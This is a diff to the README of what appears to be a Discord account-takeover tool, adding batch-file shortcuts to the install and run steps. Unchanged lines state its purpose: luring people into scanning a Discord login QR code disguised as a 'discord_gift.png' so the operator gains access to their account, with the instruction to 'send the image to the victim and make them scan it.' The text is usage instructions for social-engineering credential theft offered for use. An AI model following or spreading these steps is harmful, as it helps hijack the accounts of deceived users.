@@ -9,9 +9,9 @@ into scanning their Discord login QR Code, and gain access to their account. Use
 and make sure you click on the 'ADD TO PATH' option during
 the installation.
 
-2. Install the required modules > ```pip install -r requirements.txt``` (Make sure you are in the same directory as the folder you downloaded it in.)
+2. Install the required modules > ```pip install -r requirements.txt``` or double click `pip_install_requirements.bat`
 
-3. Type ```python QR_Generator.py``` in cmd to run
+3. Type ```python QR_Generator.py``` in cmd to run or double click `run_script.bat`
 
 4. Wait for the `discord_gift.png` to be generated. Send the image to the victim and make them scan it.
 
